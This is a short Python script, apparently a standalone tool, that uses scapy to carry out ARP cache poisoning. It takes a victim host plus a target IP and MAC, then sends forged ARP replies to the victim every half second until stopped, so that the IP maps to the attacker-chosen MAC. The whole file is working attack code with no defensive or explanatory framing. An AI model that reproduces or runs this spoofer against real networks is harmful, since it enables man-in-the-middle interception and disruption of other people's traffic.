#!/usr/bin/env python3

import os, sys, time, argparse
from scapy.all import Ether, ARP, get_if_hwaddr, get_if_addr, sendp

def buildARPReply(tip, tmac, host):
    srcip = get_if_addr('eth0')
    srchw = get_if_hwaddr('eth0')

    ether = Ether(src=srchw, dst=host)
    arp = ARP(
        hwtype=1,
        ptype=2048,
        op=2,
        hwsrc=tmac,
        psrc=tip,
        hwdst=srchw,
        pdst=srcip,
    )
    return ether / arp 

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing')
    parser.add_argument("--target-ip", help="Target logical address in ARP reply", type=str, action='store', required=True)
    parser.add_argument("--target-mac", help="Target physical address in ARP reply", type=str, action='store', required=True)
    parser.add_argument("--host", help="Host", type=str, action='store', required=True)
    args = parser.parse_args()

    host = args.host
    tip = args.target_ip
    tmac = args.target_mac

    print("Poisoning target host %s with entry (%s => %s)..." % (host, tip, tmac))
    try:
        while True:
            packet = buildARPReply(tip, tmac, host)
            sendp(packet, iface="eth0")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("-- Interrupted.")
    return 0

if __name__ == '__main__':
    sys.exit(main())